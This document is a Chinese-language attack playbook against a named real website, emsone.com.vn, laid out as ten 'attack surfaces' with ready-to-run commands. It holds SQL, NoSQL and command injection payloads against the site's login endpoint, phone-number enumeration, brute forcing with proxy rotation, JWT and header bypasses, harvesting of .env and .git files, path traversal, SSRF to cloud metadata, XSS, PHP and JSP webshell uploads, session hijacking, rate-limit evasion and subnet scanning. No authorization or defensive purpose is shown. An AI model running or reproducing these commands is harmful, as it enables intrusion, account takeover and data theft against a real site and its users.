# emsone.com.vn 全攻击面深度挖掘

## 🎯 攻击面清单（10大维度）

### 1. 登录接口攻击面

#### SQL注入（7种绕过）
```bash
# 基础SQL注入
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -d "MobileNumber=0934257886' OR '1'='1&Password=test" \
  --http2

# 时间盲注
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -d "MobileNumber=0934257886' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--&Password=test" \
  -w "\n时间: %{time_total}\n" --http2

# Unicode绕过
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -d "MobileNumber=0934257886\u0027\u0020\u004f\u0052\u0020\u0031\u003d\u0031\u002d\u002d&Password=test" \
  --http2

# 注释符绕过
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -d "MobileNumber=0934257886'/**/OR/**/1=1--&Password=test" --http2

# 大小写混合
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -d "MobileNumber=0934257886' UnIoN SeLeCt 1,2,3--&Password=test" --http2

# SQLMap自动化
sqlmap -u "https://emsone.com.vn/Account/JLogin" \
  --data "MobileNumber=0934257886&Password=test" \
  --method POST \
  -p MobileNumber,Password \
  --batch --level=5 --risk=3 \
  --tamper=space2comment,charencode,randomcase
```

#### NoSQL注入
```bash
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -H "Content-Type: application/json" \
  -d '{"MobileNumber":{"$ne":null},"Password":{"$ne":null}}' \
  --http2
```

#### 命令注入
```bash
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -d "MobileNumber=0934257886; whoami&Password=test" --http2

curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -d "MobileNumber=0934257886 | id&Password=test" --http2

curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -d "MobileNumber=0934257886 || ping -c 3 127.0.0.1&Password=test" --http2
```

#### 账户枚举
```bash
# 通过响应时间/错误消息枚举
for phone in {0934000000..0934999999}; do
    curl -X POST "https://emsone.com.vn/Account/JLogin" \
      -d "MobileNumber=$phone&Password=wrong" \
      -w "\n$phone: %{http_code} %{size_download}\n" \
      --http2 -s | grep -i "不存在\|错误\|invalid"
done
```

#### 暴力破解
```bash
# Hydra
hydra -l 0934257886 -P passwords.txt \
  emsone.com.vn https-post-form \
  "/Account/JLogin:MobileNumber=^USER^&Password=^PASS^:错误"

# 自定义脚本（代理轮换）
while read pass; do
    PROXY=$(shuf -n1 proxies.txt)
    curl --proxy $PROXY -X POST "https://emsone.com.vn/Account/JLogin" \
      -d "MobileNumber=0934257886&Password=$pass" \
      --http2 -s | grep -q "成功" && echo "[!] 密码: $pass"
done < passwords.txt
```

---

### 2. API端点攻击面

#### API端点发现
```bash
# JS文件提取API
curl -s https://emsone.com.vn | grep -oP 'src="[^"]*\.js"' | \
  sed 's/src="//;s/"//' | while read js; do
    curl -s "https://emsone.com.vn/$js" | \
      grep -oP 'https?://[^"\' ]+/api/[^"\' ]+' | sort -u
done

# 目录扫描API路径
ffuf -w api_paths.txt -u https://emsone.com.vn/FUZZ -mc 200,301,302,403

# GraphQL端点
for path in graphql graphiql v1/graphql api/graphql; do
    curl -X POST "https://emsone.com.vn/$path" \
      -H "Content-Type: application/json" \
      -d '{"query":"{ __schema { types { name } } }"}' --http2
done

# Swagger/OpenAPI
curl https://emsone.com.vn/swagger.json
curl https://emsone.com.vn/api-docs
curl https://emsone.com.vn/openapi.json
```

#### API认证绕过
```bash
# JWT None算法
# 删除Authorization头
curl https://emsone.com.vn/api/user \
  -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ." \
  --http2

# 修改User-Agent绕过
curl https://emsone.com.vn/api/admin \
  -H "User-Agent: Googlebot" --http2

# 参数污染
curl "https://emsone.com.vn/api/user?id=1&id=admin" --http2
```

---

### 3. 信息泄露攻击面

#### 敏感文件泄露
```bash
# 常见敏感文件
for file in .env .git/config .gitignore backup.sql dump.sql \
  config.php config.json web.config robots.txt sitemap.xml \
  package.json composer.json .DS_Store .htaccess; do
    curl -s "https://emsone.com.vn/$file" | \
      grep -i "password\|secret\|key\|token\|api" && \
      echo "[!] 泄露: $file"
done

# .git泄露
curl -s "https://emsone.com.vn/.git/config"
curl -s "https://emsone.com.vn/.git/logs/HEAD"

# 备份文件
for ext in .bak .old .backup .sql .zip .tar.gz; do
    curl -s "https://emsone.com.vn/index$ext" && \
      echo "[!] 备份文件: index$ext"
done
```

#### 错误信息泄露
```bash
# 触发错误
curl "https://emsone.com.vn/page?id=999999999999999999999" --http2
curl "https://emsone.com.vn/page?id=../../../../etc/passwd" --http2

# 响应头泄露
curl -I https://emsone.com.vn --http2 | \
  grep -i "server\|x-powered\|x-aspnet\|x-version"
```

#### GitHub代码泄露
```bash
# GitHub搜索
site:github.com "emsone.com.vn" password
site:github.com "emsone.com.vn" api_key
site:github.com "emsone.com.vn" secret
site:github.com "emsone.com.vn" .env
site:github.com "emsone.com.vn" aws_access_key
site:github.com "emsone.com.vn" private_key
```

---

### 4. 目录遍历攻击面

```bash
# 基础遍历
curl "https://emsone.com.vn/page?file=../../../etc/passwd" --http2
curl "https://emsone.com.vn/page?path=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts" --http2

# 编码绕过
curl "https://emsone.com.vn/page?file=....//....//etc/passwd" --http2
curl "https://emsone.com.vn/page?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd" --http2
curl "https://emsone.com.vn/page?file=..%2f..%2f..%2fetc%2fpasswd" --http2

# 空字节绕过
curl "https://emsone.com.vn/page?file=../../../etc/passwd%00.jpg" --http2
```

---

### 5. SSRF攻击面

```bash
# 内网扫描
curl "https://emsone.com.vn/page?url=http://127.0.0.1" --http2
curl "https://emsone.com.vn/page?url=http://localhost" --http2
curl "https://emsone.com.vn/page?url=http://169.254.169.254/latest/meta-data/" --http2

# 协议利用
curl "https://emsone.com.vn/page?url=file:///etc/passwd" --http2
curl "https://emsone.com.vn/page?url=gopher://127.0.0.1:80" --http2

# DNS重绑定
curl "https://emsone.com.vn/page?url=http://evil.com" \
  -H "Host: 127.0.0.1" --http2
```

---

### 6. XSS攻击面

```bash
# 反射型XSS
curl "https://emsone.com.vn/search?q=<script>alert(1)</script>" --http2
curl "https://emsone.com.vn/search?q=<img src=x onerror=alert(1)>" --http2
curl "https://emsone.com.vn/search?q=<svg onload=alert(1)>" --http2

# DOM型XSS
curl "https://emsone.com.vn/page#<script>alert(document.cookie)</script>" --http2

# 存储型XSS（需要提交）
curl -X POST "https://emsone.com.vn/comment" \
  -d "content=<script>alert(1)</script>" --http2
```

---

### 7. 文件上传攻击面

```bash
# PHP Webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -X POST "https://emsone.com.vn/upload" \
  -F "file=@shell.php" --http2

# JSP Webshell
echo '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' > shell.jsp
curl -X POST "https://emsone.com.vn/upload" \
  -F "file=@shell.jsp" --http2

# 图片马
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
curl -X POST "https://emsone.com.vn/upload" \
  -F "file=@image.jpg" --http2
```

---

### 8. 会话管理攻击面

```bash
# Session固定
SESSION1=$(curl -c cookies.txt -s "https://emsone.com.vn/dang-nhap" | \
  grep -oP 'ASP.NET_SessionId=[^;]+')
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -H "Cookie: $SESSION1" \
  -d "MobileNumber=0934257886&Password=test" \
  -c cookies_after.txt --http2

# Session劫持
# 获取有效Session后直接使用
curl "https://emsone.com.vn/dashboard" \
  -H "Cookie: ASP.NET_SessionId=stolen_session_id" --http2

# CSRF
# 生成CSRF PoC
```

---

### 9. 速率限制绕过

```bash
# 代理轮换
for proxy in $(cat proxies.txt); do
    curl --proxy $proxy -X POST "https://emsone.com.vn/Account/JLogin" \
      -d "MobileNumber=0934257886&Password=test" --http2
done

# User-Agent轮换
UA_LIST=("Mozilla/5.0" "Chrome/142" "Firefox/120" "Googlebot")
for ua in "${UA_LIST[@]}"; do
    curl -H "User-Agent: $ua" \
      -X POST "https://emsone.com.vn/Account/JLogin" \
      -d "MobileNumber=0934257886&Password=test" --http2
done

# IP轮换（通过X-Forwarded-For）
for ip in {1..254}; do
    curl -H "X-Forwarded-For: 192.168.1.$ip" \
      -X POST "https://emsone.com.vn/Account/JLogin" \
      -d "MobileNumber=0934257886&Password=test" --http2
done
```

---

### 10. 子域名/C段攻击面

```bash
# 子域名枚举
subfinder -d emsone.com.vn -all -recursive -o subs.txt
amass enum -d emsone.com.vn -active -brute -o amass.txt
chaos -d emsone.com.vn -o chaos.txt

# 存活验证
httpx -l subs.txt -mc 200,301,302,403 -o alive.txt

# C段扫描
TARGET_IP=$(dig +short emsone.com.vn | head -1)
C_SEG=$(echo $TARGET_IP | cut -d. -f1-3)
masscan $C_SEG.0/24 -p80,443,8080,8443 --rate=1000

# 测试环境发现
for env in dev test staging uat; do
    httpx -u "https://$env.emsone.com.vn" -mc 200,403
done
```

---

## 🚀 自动化攻击链

```bash
# 一键执行全攻击面扫描
./emsone_full_recon.sh

# 自动化攻击测试
python3 emsone_attack_chain.py

# Nuclei批量扫描
nuclei -l alive.txt -t ~/nuclei-templates/ \
  -severity critical,high -o nuclei_results.txt
```

---

## 📊 攻击面优先级

**高优先级：**
1. 登录接口SQL注入
2. API端点未授权访问
3. 文件上传RCE
4. 信息泄露（.env/.git）

**中优先级：**
5. SSRF内网探测
6. XSS（存储型）
7. 目录遍历
8. 会话管理漏洞

**低优先级：**
9. 账户枚举
10. 速率限制绕过

---

**最后更新：2025-11-05**
